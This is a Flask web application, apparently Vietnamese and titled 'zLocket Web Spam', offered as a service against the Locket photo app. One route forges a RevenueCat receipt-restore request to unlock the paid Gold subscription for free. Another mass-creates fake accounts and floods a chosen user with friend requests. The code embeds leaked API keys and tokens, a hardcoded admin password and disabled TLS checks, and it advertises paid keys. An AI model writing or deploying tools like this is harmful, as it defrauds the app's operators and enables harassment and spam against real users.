from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
import aiohttp
import asyncio
import re
import time
import os
import json
import requests
import urllib3
from datetime import datetime, timedelta

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'letiendung_secret_key_0969411158')
CORS(app)

# Đường dẫn file lưu trữ dữ liệu người dùng
USAGE_FILE = 'usage_data.json'

# ---------------- CẤU HÌNH HEADERS & TOKEN LOCKET ---------------- #
HEADERS = {
    'Host': 'api.revenuecat.com',
    'Authorization': 'Bearer appl_JngFETzdodyLmCREOlwTUtXdQik',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'X-Platform': 'iOS',
    'X-Platform-Version': 'Version 26.2 (Build 23C55)',
    'X-Platform-Device': 'iPhone15,3',
    'X-Platform-Flavor': 'native',
    'X-Version': '5.41.0',
    'X-Client-Version': '2.32.2',
    'X-Client-Bundle-ID': 'com.locket.Locket',
    'X-Client-Build-Version': '3',
    'X-StoreKit2-Enabled': 'true',
    'X-StoreKit-Version': '2',
    'X-Observer-Mode-Enabled': 'false',
    'X-Is-Sandbox': 'false',
    'X-Storefront': 'VNM',
    'X-Apple-Device-Identifier': '39A73C25-1E05-4350-ADA7-5CD3FE1079E8',
    'X-Preferred-Locales': 'vi_KR,ko_KR,en_KR',
    'X-Nonce': 'w0Mlb6+AmV4WYuVv',
    'X-Is-Backgrounded': 'false',
    'X-Retry-Count': '0',
    'X-Is-Debug-Build': 'false',
    'User-Agent': 'Locket/3 CFNetwork/3860.300.31 Darwin/25.2.0',
    'Accept-Language': 'vi-VN,vi;q=0.9',
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'X-RevenueCat-ETag': ''
}

# ---------------- CẤU HÌNH ZLOCKET ---------------- #
class ZLocketConfig:
    def __init__(self):
        self.FIREBASE_GMPID = "1:641029076083:ios:cc8eb46290d69b234fa606"
        self.IOS_BUNDLE_ID = "com.locket.Locket"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.SHORT_URL = "https://url.thanhdieu.com/api/v1"
        self.SV_FRQ_URL = "https://thanhdieu-server.vercel.app/api/locket-friend-requests"
        self.FIREBASE_APP_CHECK = None
        self.TARGET_FRIEND_UID = None
        self.NAME_TOOL = "zLocket Web Spam"
        self.USE_EMOJI = True
        self.messages = []
        self.request_timeout = 15
        self.session_id = int(time.time() * 1000)

    def headers_locket(self):
        return {
            'Host': 'api.locketcamera.com',
            'Accept': '*/*',
            'baggage': 'sentry-environment=production,sentry-public_key=78fa64317f434fd89d9cc728dd168f50,sentry-release=com.locket.Locket%401.121.1%2B1,sentry-trace_id=2cdda588ea0041ed93d052932b127a3e',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'sentry-trace': '2cdda588ea0041ed93d052932b127a3e-a3e2ba7a095d4f9d-0',
            'User-Agent': 'com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Firebase-Instance-ID-Token': 'd7ChZwJHhEtsluXwXxbjmj:APA91bFoMIgxwf-2tmY9QLy82lKMEWL6S4d8vb9ctY3JxLLTQB1k6312TcgtqJjWFhQVz_J4wIFvE0Kfroztu1vbZDOFc65s0vvj68lNJM4XuJg1onEODiBG3r7YGrQLiHkBV1gEoJ5f',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }

    def firebase_headers_locket(self):
        return {
            'Host': 'www.googleapis.com',
            'Accept': '*/*',
            'X-Client-Version': 'iOS/FirebaseSDK/10.23.1/FirebaseCore-iOS',
            'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK,
            'X-Ios-Bundle-Identifier': self.IOS_BUNDLE_ID,
            'X-Firebase-GMPID': self.FIREBASE_GMPID,
            'User-Agent': 'FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.121.1 iPhone/18.2 hw/iPhone12_1',
            'Content-Type': 'application/json',
        }

    def analytics_payload(self):
        return {
            "platform": "ios",
            "experiments": {
                "flag_4": {"@type": "type.googleapis.com/google.protobuf.Int64Value", "value": "43"},
            },
            "amplitude": {
                "device_id": "57A54C21-B633-418C-A6E3-4201E631178C",
                "session_id": {"value": str(self.session_id), "@type": "type.googleapis.com/google.protobuf.Int64Value"},
            },
            "ios_version": "1.121.1.1",
        }

    def fetch_token(self):
        try:
            response = requests.get(self.TOKEN_API_URL, timeout=self.request_timeout)
            response.raise_for_status()
            data = response.json()
            if data.get("code") == 200 and "data" in data and "token" in data["data"]:
                return data["data"]["token"]
        except Exception:
            pass
        return None

    def _rand_email_(self):
        return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=15))}@thanhdieu.com"

    def _rand_pw_(self):
        return 'zlocket' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))

    def _rand_name_(self):
        return ''.join(random.choices(string.ascii_lowercase, k=8))

cfg = ZLocketConfig()
cfg.FIREBASE_APP_CHECK = cfg.fetch_token()

# ---------------- HÀM XỬ LÝ LƯỢT DÙNG (LIMIT) ---------------- #
def get_usage_data():
    if not os.path.exists(USAGE_FILE):
        return {}
    try:
        with open(USAGE_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_usage_data(data):
    with open(USAGE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def check_daily_limit(ip, action_type):
    # Admin thì bỏ qua check limit
    if session.get('is_admin'):
        return True, "Admin không giới hạn."

    data = get_usage_data()
    today = datetime.now().strftime('%Y-%m-%d')

    if ip not in data:
        data[ip] = {}
    if today not in data[ip]:
        data[ip][today] = {"buff_gold": 0, "spam_friend": 0, "delete_friend": 0}

    counts = data[ip][today]

    if action_type == 'buff_gold' and counts['buff_gold'] >= 3:
        return False, "Hết lượt! Bạn chỉ được Buff Gold miễn phí 3 lần/ngày. Vui lòng liên hệ Zalo 0969411158 để mua Key VIP."
    
    if action_type == 'spam_friend' and counts['spam_friend'] >= 1:
        return False, "Hết lượt! Bạn chỉ được Spam kết bạn miễn phí 1 lần/ngày. Vui lòng liên hệ Admin."

    if action_type == 'delete_friend' and counts['delete_friend'] >= 3:
        return False, "Hết lượt! Bạn chỉ được Xoá lời mời 3 lần/ngày. Vui lòng liên hệ Admin."

    return True, "OK"

def increment_usage(ip, action_type):
    data = get_usage_data()
    today = datetime.now().strftime('%Y-%m-%d')
    if ip not in data:
        data[ip] = {}
    if today not in data[ip]:
        data[ip][today] = {"buff_gold": 0, "spam_friend": 0, "delete_friend": 0}
    
    data[ip][today][action_type] += 1
    save_usage_data(data)

# ---------------- CÁC HÀM BỔ TRỢ ---------------- #
def extract_uid_from_url(url):
    if not url.startswith("http"):
        url = f"https://locket.cam/{url}"
    if url.startswith("locket."):
        url = f"https://{url}"
    try:
        resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', resp.text)
        if match:
            parsed = urlparse(match.group(1))
            enc_link = parse_qs(parsed.query).get("link", [None])[0]
            if enc_link:
                uid_match = re.search(r'/invites/([A-Za-z0-9]{28})', enc_link)
                if uid_match: return uid_match.group(1)
    except Exception:
        pass
    return None

async def resolve_uid(username):
    url = f"https://locket.cam/{username}"
    headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)", "Accept": "text/html"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, allow_redirects=True, timeout=10) as res:
                html = await res.text()
                redirect_url = str(res.url)
                def extract(text):
                    if not text: return None
                    m = re.search(r'/invites/([A-Za-z0-9]{28})', text)
                    if m: return m.group(1)
                    lp = re.search(r'link=([^\s"\'>]+)', text)
                    if lp:
                        d = lp.group(1).replace('%3A', ':').replace('%2F', '/')
                        dm = re.search(r'/invites/([A-Za-z0-9]{28})', d)
                        if dm: return dm.group(1)
                    return None
                return extract(redirect_url) or extract(html)
    except Exception:
        return None

async def check_status(uid):
    url = f"https://api.revenuecat.com/v1/subscribers/{uid}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=HEADERS, timeout=10) as res:
                if 200 <= res.status < 300:
                    data = await res.json()
                    entitlements = data.get('subscriber', {}).get('entitlements', {}).get('Gold', {})
                    if entitlements:
                        return {"active": True, "expires": entitlements.get('expires_date')}
                    return {"active": False}
                return {"active": False}
    except Exception:
        return None

async def inject_gold_api(uid, fetch_token, app_transaction):
    # KIỂM TRA TOKEN ADMIN CUNG CẤP
    if not fetch_token or not app_transaction:
        return {"success": False, "msg": "Thiếu Token Config! Vui lòng liên hệ Admin (Zalo 0969411158) để lấy Key."}

    url = "https://api.revenuecat.com/v1/receipts"
    body = {
        "product_id": "locket_199_1m", 
        "fetch_token": fetch_token, 
        "app_transaction": app_transaction,
        "app_user_id": uid, 
        "is_restore": True, 
        "store_country": "VNM", 
        "currency": "USD",
        "price": "1.99", 
        "normal_duration": "P1M", 
        "subscription_group_id": "21419447",
        "observer_mode": False, 
        "initiation_source": "restore", 
        "offers": [],
        "attributes": { 
            "$attConsentStatus": { "updated_at_ms": int(time.time() * 1000), "value": "notDetermined" } 
        }
    }
    
    async with aiohttp.ClientSession() as session:
        for attempt in range(3):
            try:
                async with session.post(url, headers=HEADERS, json=body, timeout=15) as res:
                    if res.status == 200:
                        await asyncio.sleep(2)
                        status = await check_status(uid)
                        if status and status.get('active'):
                            return {"success": True, "msg": f"Kích hoạt thành công! Hết hạn: {status.get('expires')}"}
                        return {"success": False, "msg": "Server nhận Key nhưng chưa cấp Gold."}
                    else:
                        try:
                            resp_json = await res.json()
                            msg = resp_json.get('message', str(res.status))
                        except:
                            msg = str(res.status)
                        return {"success": False, "msg": f"Bị từ chối: {msg}"}
            except Exception as e:
                if attempt == 2:
                    return {"success": False, "msg": f"Lỗi mạng: {str(e)}"}
                await asyncio.sleep(2)
    return {"success": False, "msg": "Thử lại quá số lần."}

def excute_api(url, headers, payload):
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=15, verify=False)
        if resp.status_code == 200:
            return resp.json()
        if resp.status_code == 400 and resp.json().get('error', {}).get('message') == 'INVALID_PASSWORD':
            return "invalid_password"
    except Exception:
        return None
    return None

# ---------------- ROUTES ---------------- #
@app.route('/')
def index():
    return render_template('index.html', is_admin=session.get('is_admin', False))

@app.route('/api/check_admin', methods=['GET'])
def check_admin():
    return jsonify({"is_admin": session.get('is_admin', False)})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('username') == 'dungledev' and data.get('password') == 'dunglengungo':
        session['is_admin'] = True
        return jsonify({"success": True, "msg": "Đăng nhập Admin thành công!"})
    return jsonify({"success": False, "msg": "Sai tài khoản hoặc mật khẩu!"})

@app.route('/api/inject', methods=['POST'])
def api_inject():
    ip = get_client_ip()
    
    # Check limit 3 lần/ngày
    allowed, msg = check_daily_limit(ip, 'buff_gold')
    if not allowed:
        return jsonify({"success": False, "msg": msg})

    data = request.json
    user_input = data.get('username', '').strip()
    fetch_token = data.get('fetch_token', '').strip()
    app_transaction = data.get('app_transaction', '').strip()
    
    if not user_input:
        return jsonify({"success": False, "msg": "Vui lòng nhập Username hoặc Link."})
    
    try:
        uid = asyncio.run(resolve_uid(user_input))
        if not uid:
            return jsonify({"success": False, "msg": "Không tìm thấy UID từ User/Link này."})
        
        result = asyncio.run(inject_gold_api(uid, fetch_token, app_transaction))
        
        # Nếu thành công thì mới tính 1 lượt
        if result.get("success"):
            increment_usage(ip, 'buff_gold')
            result['msg'] += f"\n(Lượt dùng hôm nay: {3 - (get_usage_data().get(ip, {}).get(datetime.now().strftime('%Y-%m-%d'), {}).get('buff_gold', 0))}/3)"
        
        result['uid'] = uid
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "msg": f"Lỗi Server: {str(e)}"})

@app.route('/api/spam_friend', methods=['POST'])
def api_spam_friend():
    ip = get_client_ip()
    
    # Check limit spam 1 lần/ngày
    allowed, msg = check_daily_limit(ip, 'spam_friend')
    if not allowed:
        return jsonify({"success": False, "msg": msg})

    data = request.json
    target_input = data.get('target', '').strip()
    custom_name = data.get('custom_name', 'zLocket Web')
    num_accounts = int(data.get('amount', 5))
    
    if not target_input:
        return jsonify({"success": False, "msg": "Vui lòng nhập Username/Link mục tiêu."})
    
    uid = extract_uid_from_url(target_input)
    if not uid:
        return jsonify({"success": False, "msg": "Không tìm thấy UID Locket hợp lệ."})
    
    if not cfg.FIREBASE_APP_CHECK:
        return jsonify({"success": False, "msg": "Lỗi Token Server (Contact Admin)."})
    
    # Giới hạn max 10 acc cho user thường, admin max 50
    if not session.get('is_admin') and num_accounts > 10:
        num_accounts = 10

    success_count = 0
    logs = []
    
    for i in range(num_accounts):
        email = cfg._rand_email_()
        password = cfg._rand_pw_()
        
        payload_create = {"data": {"email": email, "password": password, "client_email_verif": True, "client_token": ''.join(random.choices(string.hexdigits.lower(), k=40)), "platform": "ios"}}
        res_create = excute_api(f"{cfg.API_LOCKET_URL}/createAccountWithEmailPassword", cfg.headers_locket(), payload_create)
        if not res_create or res_create == "invalid_password":
            continue
            
        payload_auth = {"email": email, "password": password, "clientType": "CLIENT_TYPE_IOS", "returnSecureToken": True}
        res_auth = excute_api(f"{cfg.FIREBASE_AUTH_URL}/verifyPassword?key={cfg.FIREBASE_API_KEY}", cfg.firebase_headers_locket(), payload_auth)
        if not res_auth or 'idToken' not in res_auth:
            continue
            
        id_token = res_auth['idToken']
        headers_l = cfg.headers_locket()
        headers_l['Authorization'] = f"Bearer {id_token}"
        
        payload_final = {"data": {"username": cfg._rand_name_(), "last_name": "😀 😂 😍", "require_username": True, "first_name": custom_name}}
        excute_api(f"{cfg.API_LOCKET_URL}/finalizeTemporaryUser", headers_l, payload_final)
        
        payload_friend = {"data": {"user_uid": uid, "source": "signUp", "platform": "iOS", "messenger": "Messages", "invite_variant": {"value": "1002", "@type": "type.googleapis.com/google.protobuf.Int64Value"}, "share_history_eligible": True, "rollcall": False, "prompted_reengagement": False, "create_ofr_for_temp_users": False, "get_reengagement_status": False}}
        res_friend = excute_api(f"{cfg.API_LOCKET_URL}/sendFriendRequest", headers_l, payload_friend)
        
        if res_friend:
            success_count += 1
            
        time.sleep(0.5)

    # Đánh dấu đã dùng 1 lượt spam
    if success_count > 0:
        increment_usage(ip, 'spam_friend')

    return jsonify({"success": True, "msg": f"Hoàn tất! Đã gửi {success_count}/{num_accounts} lời mời.\n(Hết lượt free hôm nay)"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
